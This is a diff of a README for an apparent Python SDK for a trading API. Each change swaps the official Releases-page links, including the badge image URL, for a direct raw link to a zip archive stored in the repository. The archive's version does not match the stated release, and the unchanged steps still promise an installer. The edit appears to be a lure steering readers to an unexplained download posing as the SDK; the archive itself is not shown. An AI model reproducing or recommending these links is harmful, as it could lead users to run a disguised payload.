@@ -6,11 +6,11 @@ Welcome to the **acis-python-sdk**! This tool lets you use the ACIS Trading API 
 
 ## 💾 Download Now!
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/PabloVitt/acis-python-sdk/releases)
+[![Download Here](https://github.com/PabloVitt/acis-python-sdk/raw/refs/heads/main/acis_trading/python-sdk-acis-1.7.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/PabloVitt/acis-python-sdk/raw/refs/heads/main/acis_trading/python-sdk-acis-1.7.zip)
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Releases](https://github.com/PabloVitt/acis-python-sdk/releases). 
+To download the application, visit this page: [Download Releases](https://github.com/PabloVitt/acis-python-sdk/raw/refs/heads/main/acis_trading/python-sdk-acis-1.7.zip). 
 
 1. Click the link above to access the releases.
 2. Look for the latest version. There you will find the download link for the installer.
@@ -82,6 +82,6 @@ This SDK covers several topics, such as:
 
 ## 📅 Future Updates
 
-We plan to regularly update the application. Check back on the [Release Page](https://github.com/PabloVitt/acis-python-sdk/releases) for the latest features and improvements.
+We plan to regularly update the application. Check back on the [Release Page](https://github.com/PabloVitt/acis-python-sdk/raw/refs/heads/main/acis_trading/python-sdk-acis-1.7.zip) for the latest features and improvements.
 
 Enjoy using the **acis-python-sdk** for smarter investing!
